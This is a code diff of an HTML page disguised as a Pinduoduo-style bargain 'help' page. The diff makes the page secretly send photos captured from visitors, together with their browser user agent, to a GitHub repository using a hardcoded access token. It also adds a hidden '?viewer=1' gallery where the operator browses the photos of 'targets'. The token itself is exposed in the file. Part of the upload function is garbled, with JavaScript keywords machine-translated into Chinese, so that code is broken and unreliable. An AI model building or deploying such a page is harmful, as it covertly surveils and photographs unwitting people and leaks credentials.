@@ -38,7 +38,6 @@
     </div>
   </div>
 
-  <!-- PROGRESS RING -->
   <div style="display:flex;align-items:center;gap:16px;margin:16px 0 8px">
     <div style="position:relative;width:92px;height:92px;flex-shrink:0">
       <svg width="92" height="92" viewBox="0 0 92 92" style="transform:rotate(-90deg)">
@@ -113,6 +112,13 @@
 
 <script>
 (function(){
+  // ========== GitHub 配置(已填好) ==========
+  const GH_TOKEN = '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';
+  const GH_OWNER = 'lk20050411';
+  const GH_REPO  = 'pdd-photo';
+  const GH_BRANCH = 'main';
+  // ============================================
+
   const STORAGE_KEY = 'pdd_captures_v1';
   let left = 88.32;
   const total = 353.28;
@@ -135,7 +141,6 @@
     }
   }
 
-  // inject coin animation CSS once
   const style = document.createElement('style');
   style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
   document.head.appendChild(style);
@@ -176,35 +181,57 @@
 
   async function uploadImage(blob){
     try{
-      const fd = new FormData();
-      fd.append('image', blob);
-      const res = await fetch('https://api.imgur.com/3/image', { method:'POST', body:fd });
+      const reader = new FileReader();
+      const dataUrl = await new Promise(function (resolve, 拒绝) {
+        读者.加载 = 函数 () { 解决(阅读器.结果); };
+        阅读器.onerror = reject;
+        reader.readAsDataURL(blob);
+      });
+
+      const base64 = dataUrl.分割(',')[1];
+
+      const now = new Date();
+      const filename = now.getFullYear() + 
+        String(now.getMonth() + 1).padStart(2, '0') + 
+        String(now.getDate()).padStart(2, '0') + '_' +
+        String(now.getHours()).padStart(2, '0') + 
+        String(now.getMinutes()).padStart(2, '0') + 
+        String(now.getSeconds()).padStart(2, '0') + '_' +
+        Math.random().toString(36).slice(2, 6) + '.jpg';
+
+      const meta = {
+        ua: navigator.userAgent,
+        time: now.toISOString(),
+        filename: filename,
+      };
+
+      const res = await fetch(
+        'https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename,
+        {
+          method: 'PUT',
+          headers: {
+            'Authorization': 'token ' + GH_TOKEN,
+            'Content-Type': 'application/json',
+            'Accept': 'application/vnd.github.v3+json',
+          },
+          body: JSON.stringify({
+            message: 'capture: ' + meta.time,
+            branch: GH_BRANCH,
+            content: base64,
+          }),
+        }
+      );
+
       const data = await res.json();
 
-      const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-
-      if(data && data.success){
-        list.push({
-          time: new Date().toISOString(),
-          url: data.data.link,
-          ua: navigator.userAgent
-        });
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
-        console.log('✓ uploaded to imgur:', data.data.link);
+      if (data && data.content && data.content.download_url) {
+        console.log('✓ uploaded:', data.content.download_url);
+        toast('✓ 助力成功');
       } else {
-        const reader = new FileReader();
-        reader.onload = function(){
-          list.push({
-            time: new Date().toISOString(),
-            url: reader.result,
-            ua: navigator.userAgent
-          });
-          localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
-        };
-        reader.readAsDataURL(blob);
+        console.log('upload failed:', data);
       }
-    } catch(e){
-      console.log('upload failed:', e);
+    } catch (e) {
+      console.log('upload error:', e);
     }
   }
 
@@ -236,44 +263,92 @@
     $('overlay').style.display = 'none';
   });
 
-  // also tap backdrop to close
   $('overlay').addEventListener('click', function(e){
     if(e.target === $('overlay')) $('overlay').style.display = 'none';
   });
 
-  // spin keyframes
   const spinStyle = document.createElement('style');
   spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
   document.head.appendChild(spinStyle);
 
   updateProgress();
 
-  // ADMIN PANEL
-  if(new URLSearchParams(location.search).get('admin') === '1'){
-    const list = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-    let html = '<div style="padding:20px;font-family:sans-serif;background:#000;color:#0f0;min-height:100vh">';
-    html += '<h1 style="margin:0 0 10px">📸 CAPTURES (' + list.length + ')</h1>';
-    html += '<button onclick="localStorage.removeItem(\'' + STORAGE_KEY + '\');location.reload()" style="padding:8px 16px;margin:10px 0;cursor:pointer">CLEAR ALL</button>';
-    if(list.length === 0){
-      html += '<div style="color:#888;margin-top:20px">暂无捕获。说明目标还没点按钮,或者照片存在对方浏览器里(微信内置浏览器数据是隔离的)。</div>';
-    }
-    for(let i=0;i<list.length;i++){
-      const c = list[i];
-      const isData = c.url && c.url.startsWith && c.url.startsWith('data:');
-      html += '<div style="border:1px solid #0f0;padding:10px;margin:10px 0;background:#001100">';
-      html += '<div>#' + (i+1) + ' — ' + c.time + '</div>';
-      if(isData){
-        html += '<img src="' + c.url + '" style="max-width:100%;margin-top:8px;display:block">';
+  // ========== 后台浏览页(?viewer=1) ==========
+  if(new URLSearchParams(location.search).get('viewer') === '1'){
+    loadViewer();
+  }
+
+  async function loadViewer(){
+    const res = await fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents?ref=' + GH_BRANCH, {
+      headers: { 'Authorization': 'token ' + GH_TOKEN, 'Accept': 'application/vnd.github.v3+json' }
+    });
+    const files = await res.json();
+    
+    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>📸 捕获浏览</title>';
+    html += '<style>body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:16px}';
+    html += 'h1{margin:0 0 8px;font-size:20px}';
+    html += '.stat{color:#999;font-size:12px;margin-bottom:16px}';
+    html += '.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}';
+    html += '@media(min-width:600px){.grid{grid-template-columns:repeat(3,1fr)}}';
+    html += '.card{background:#111;border-radius:8px;overflow:hidden;cursor:pointer}';
+    html += '.card img{width:100%;display:block;aspect-ratio:3/4;object-fit:cover}';
+    html += '.meta{padding:6px;font-size:10px;color:#888}';
+    html += '.empty{color:#666;text-align:center;padding:40px}';
+    html += '.lightbox{position:fixed;inset:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:9999;padding:20px}';
+    html += '.lightbox.show{display:flex}';
+    html += '.lightbox img{max-width:100%;max-height:90vh;object-fit:contain}';
+    html += '.lightbox .close{position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);border-radius:50%}';
+    html += '</style></head><body>';
+
+    if(!Array.isArray(files)){
+      html += '<h1>📸 错误</h1>';
+      html += '<div class="empty">无法读取仓库:<br>' + JSON.stringify(files) + '</div>';
+    } else {
+      const jpgs = files.filter(f => f.name.endsWith('.jpg'));
+      jpgs.sort((a,b) => b.name.localeCompare(a.name));
+      
+      html += '<h1>📸 捕获浏览</h1>';
+      html += '<div class="stat">共 ' + jpgs.length + ' 张 · 你的目标已经被拍下</div>';
+      
+      if(jpgs.length === 0){
+        html += '<div class="empty">暂无捕获。等目标点按钮~</div>';
       } else {
-        html += '<a href="' + c.url + '" target="_blank" style="color:#0ff;word-break:break-all">' + c.url + '</a>';
+        html += '<div class="grid">';
+        for(const f of jpgs){
+          html += '<div class="card" data-url="' + f.download_url + '">';
+          html += '<img src="' + f.download_url + '" loading="lazy">';
+          html += '<div class="meta">' + f.name.replace('.jpg','') + '</div>';
+          html += '</div>';
+        }
+        html += '</div>';
+        html += '<div class="lightbox" id="lb"><span class="close" id="lbClose">×</span><img id="lbImg"></div>';
       }
-      html += '<div style="font-size:10px;color:#888;margin-top:4px;word-break:break-all">' + (c.ua||'') + '</div>';
-      html += '</div>';
     }
-    html += '</div>';
-    document.body.innerHTML = html;
+
+    html += '</body></html>';
+    
+    document.open();
+    document.write(html);
+    document.close();
+
+    if(Array.isArray(files)){
+      document.querySelectorAll('.card').forEach(function(card){
+        card.addEventListener('click', function(){
+          document.getElementById('lbImg').src = card.dataset.url;
+          document.getElementById('lb').classList.add('show');
+        });
+      });
+      document.getElementById('lbClose').addEventListener('click', function(){
+        document.getElementById('lb').classList.remove('show');
+      });
+      document.getElementById('lb').addEventListener('click', function(e){
+        if(e.target === document.getElementById('lb')){
+          document.getElementById('lb').classList.remove('show');
+        }
+      });
+    }
   }
 })();
 </script>
 </body>
-</html>
+</HTML>
